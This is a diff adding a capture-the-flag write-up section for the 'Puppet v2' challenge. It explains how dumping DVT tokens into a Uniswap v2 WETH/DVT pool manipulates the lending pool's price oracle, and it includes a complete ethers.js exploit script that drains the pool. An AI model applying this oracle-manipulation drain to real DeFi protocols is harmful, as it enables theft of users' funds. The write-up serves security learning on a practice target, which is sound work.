@@ -607,3 +607,52 @@ it('Exploit', async function () {
   );
 });
 ```
+
+## 9 - Puppet v2
+
+This challenge is very similiar to previous one, so I won't go in depth. Logic is exactly the same. It introduces UniSwap v2 contracts, so that might be interesting. Other than that, there is not much new happening.
+
+The difference here is that there is no ETH/ERC20 pair, rather we have WETH/ERC20 pair. UniSwap v2 introduces ERC20/ERC20 pairs, and to make cleaner codebase they only allow using Wrapped ETH (WETH) which is just an ERC20 representation of ETH.
+
+To exploit this, we will follow the same logic from 8. challenge (Puppet). Fistly, we deposit all available DVT in WETH/DVT pool to devalue it. Once that's done we will be able to borrow all funds from **PuppetV2Pool.sol**. But, there is a catch. We need to exchange ETH for WETH because lender pool requires WETH. So once we have WETH we'll be able to borrow whole DVT from **PuppetV2Pool.sol**.
+
+Solution code:
+
+**puppet-v2.challenge.js**
+
+```js
+it('Exploit', async function () {
+  /** CODE YOUR EXPLOIT HERE */
+  const attackWeth = this.weth.connect(attacker);
+  const attackToken = this.token.connect(attacker);
+  const attackRouter = this.uniswapRouter.connect(attacker);
+  const attackLender = this.lendingPool.connect(attacker);
+
+  await attackToken.approve(
+    attackRouter.address,
+    ATTACKER_INITIAL_TOKEN_BALANCE
+  );
+  await attackRouter.swapExactTokensForTokens(
+    ATTACKER_INITIAL_TOKEN_BALANCE,
+    ethers.utils.parseEther('9'),
+    [attackToken.address, attackWeth.address],
+    attacker.address,
+    (await ethers.provider.getBlock('latest')).timestamp * 2
+  );
+
+  const deposit = await attackLender.calculateDepositOfWETHRequired(
+    POOL_INITIAL_TOKEN_BALANCE
+  );
+  await attackWeth.approve(attackLender.address, deposit);
+
+  const tx = {
+    to: attackWeth.address,
+    value: ethers.utils.parseEther('19.9'),
+  };
+  await attacker.sendTransaction(tx);
+
+  await attackLender.borrow(POOL_INITIAL_TOKEN_BALANCE, {
+    gasLimit: 1e6,
+  });
+});
+```
